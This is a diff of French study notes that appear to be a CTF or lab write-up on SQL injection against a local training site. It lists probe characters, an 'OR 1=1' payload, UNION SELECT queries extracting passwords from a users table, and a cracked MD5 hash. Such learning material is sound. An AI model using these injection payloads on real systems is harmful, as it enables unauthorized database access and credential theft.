@@ -1,6 +1,8 @@
 Source:,
 - https://www.vaadata.com/blog/fr/injections-sql-principes-impacts-exploitations-bonnes-pratiques-securite/
 - https://zestedesavoir.com/tutoriels/945/les-injections-sql-le-tutoriel/les-injections-sql-classiques/affichage-denregistrements/
+- https://tcm-sec.com/avoid-or-1-equals-1-in-sql-injections/
+- https://www.w3schools.com/sql/sql_injection.asp
 
 Une injection SQL se produit lorsqu’un utilisateur malveillant communique une entrée qui modifie la requête SQL envoyée par l’application web à la base de données.
 
@@ -8,6 +10,7 @@ Une injection SQL se produit lorsqu’un utilisateur malveillant communique une 
 
 Ajouter l’une des payload ci-dessous après notre nom d’utilisateur et voir si cela provoque des erreurs ou modifie le comportement de la page : ‘ / « / # / ; / )
 
+	1 OR 1=1
     Sur notre site cela affiche bien une erreur et dans l'URL nous avons la requete envoyee: http://192.168.56.102/index.php?page=signin&username=%27&password=&Login=Login#
 
 
@@ -38,5 +41,9 @@ ORDER BY permet de trier le résultat en précisant le(s) champ(s) ainsi que l'o
     1 UNION SELECT 1, Commentaire FROM users (surname Decrypt this password -> then lower all the char. Sh256 on it and it's good !)
     1 UNION SELECT 1, countersign FROM users (prendre le 5eme)
 
+	https://www.dcode.fr/fonction-hash
+
     md5 decrypt: 5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo
-    sha256:9995cae900a927ab1500d317dfcc52c0ad8a521bea878a8e9fa381b41459b646
+
+    sha256:
+	10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
